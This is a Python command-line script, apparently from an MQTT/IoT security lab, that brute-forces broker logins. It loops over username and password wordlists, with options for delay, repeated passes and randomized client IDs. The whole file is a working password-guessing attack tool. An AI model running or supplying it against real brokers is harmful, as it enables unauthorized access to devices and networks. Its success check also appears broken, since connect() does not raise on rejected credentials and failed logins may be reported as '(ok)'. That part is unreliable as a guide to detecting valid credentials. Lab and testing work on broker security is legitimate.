#!/usr/bin/env python3
import time
import json
import os
import sys
import argparse
import random
from paho.mqtt.client import Client

# -------------------------------------------------------------------
# Resolve paths relative to script location
# -------------------------------------------------------------------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))  # /attacks
BASE_DIR = os.path.dirname(SCRIPT_DIR)                   # project root
CONFIG_PATH = os.path.join(BASE_DIR, "configs", "network_config.json")

USERS_PATH = os.path.join(BASE_DIR, "users.txt")
PASSWORDS_PATH = os.path.join(BASE_DIR, "passwords.txt")

# -------------------------------------------------------------------
# CLI
# -------------------------------------------------------------------
p = argparse.ArgumentParser(description="MQTT brute-force tester (tunable)")
p.add_argument("broker", nargs="?", help="Broker IP (optional, else from config)")
p.add_argument("--port", type=int, default=1883)
p.add_argument("--delay", type=float, default=0.05, help="Delay between attempts (seconds)")
p.add_argument("--loop", type=int, default=1, help="Repeat full username/password list this many times")
p.add_argument("--random-client", action="store_true", help="Use random client ids for each attempt")
args = p.parse_args()

# -------------------------------------------------------------------
# Determine broker IP source
# -------------------------------------------------------------------
if args.broker:
    BROKER = args.broker
    print(f"[INFO] Using broker IP from CLI: {BROKER}")
else:
    print(f"[INFO] No broker IP passed via CLI — loading from config...")
    try:
        with open(CONFIG_PATH, "r") as f:
            cfg = json.load(f)
            BROKER = cfg.get("broker_ip", "127.0.0.1")
        print(f"[INFO] Loaded broker IP from config: {BROKER}")
    except Exception as e:
        print(f"[ERROR] Could not load config file: {e}")
        print("[INFO] Falling back to default broker 127.0.0.1")
        BROKER = "127.0.0.1"

PORT = args.port

# -------------------------------------------------------------------
# Load usernames + passwords
# -------------------------------------------------------------------
with open(USERS_PATH) as f:
    usernames = [u.strip() for u in f if u.strip()]

with open(PASSWORDS_PATH) as f:
    passwords = [p.strip() for p in f if p.strip()]

print(f"[INFO] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
print(f"[INFO] Delay between attempts: {args.delay}s. Loop count: {args.loop}. Random client id: {args.random_client}")

# -------------------------------------------------------------------
# Bruteforce loop
# -------------------------------------------------------------------
attempt = 0
for loop_idx in range(max(1, args.loop)):
    for u in usernames:
        for p in passwords:
            attempt += 1
            client_id = f"bf-{random.randint(100000,999999)}" if args.random_client else None
            try:
                client = Client(client_id=client_id) if client_id else Client()
                client.username_pw_set(u, p)
                client.connect(BROKER, PORT, keepalive=10)
                client.disconnect()
                print(f"[TRY]  {u}:{p}  (ok)")
            except Exception:
                print(f"[FAIL] {u}:{p}")
            time.sleep(args.delay)

print(f"[INFO] Bruteforce completed. Attempts: {attempt}")
